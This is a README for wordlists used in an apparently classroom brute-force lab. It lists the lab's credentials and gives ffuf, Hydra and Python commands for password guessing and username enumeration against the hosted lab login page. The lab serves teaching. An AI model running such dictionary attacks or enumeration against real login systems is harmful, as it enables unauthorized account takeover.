# Wordlists

Dictionaries for attacking the Brute Force Lab. Clone this repo and point your
tool (Hydra, ffuf, Burp, or a Python script) at these files. **Every lab
credential is contained in these lists**, so a dictionary attack will find it.

> Use these only against the lab. Attacking any system you don't own or have
> written permission to test is illegal.

## Password lists

| File | Size | Use it for |
|------|------|------------|
| `passwords.txt` | ~18 | Quick runs / demos. Finishes in seconds. Contains all lab passwords. |
| `passwords-top100.txt` | ~100 | A more realistic run — you'll see misses before the hit. Contains all lab passwords. |

Lab passwords included in both: `password`, `123456`, `abc123`, `letmein`,
`charley`.

## Username lists

| File | Size | Use it for |
|------|------|------------|
| `usernames.txt` | ~10 | The six lab accounts plus a few decoys. |
| `usernames-common.txt` | ~40 | A broader list for practising username enumeration. |

Lab usernames included in both: `admin`, `gordonb`, `1337`, `pablo`, `smithy`,
`student`.

## Example usage

Replace `CLASSPASS` with the class-gate password your instructor gave you.

**ffuf — crack `admin`:**
```bash
ffuf -w passwords-top100.txt \
  -X POST -d "username=admin&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u https://brute-force-lab-m6q2.onrender.com/login \
  -u-basic student:CLASSPASS \
  -fr "incorrect"
```

**Hydra — crack `admin`:**
```bash
hydra -l admin -P passwords-top100.txt \
  brute-force-lab-m6q2.onrender.com https-post-form \
  "/login:username=^USER^&password=^PASS^:incorrect"
```

**Python — spray a username list to find valid accounts (enumeration):**
```python
import requests
BASE = "https://brute-force-lab-m6q2.onrender.com"
s = requests.Session(); s.auth = ("student", "CLASSPASS")
s.get(f"{BASE}/set-level/low")
for u in open("usernames-common.txt"):
    u = u.strip()
    r = s.post(f"{BASE}/login", data={"username": u, "password": "x"})
    if "Password incorrect for that user" in r.text:
        print(f"[+] valid user: {u}")
```

See [../LEVEL_MANUAL.md](../LEVEL_MANUAL.md) for the full per-level walkthrough.

## Want a bigger list?

On Kali, the classic `rockyou.txt` also contains every lab password:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz   # first time only
# then use /usr/share/wordlists/rockyou.txt
```
It's 14M lines, so against the live site it's slow — the small lists here are
faster for class.
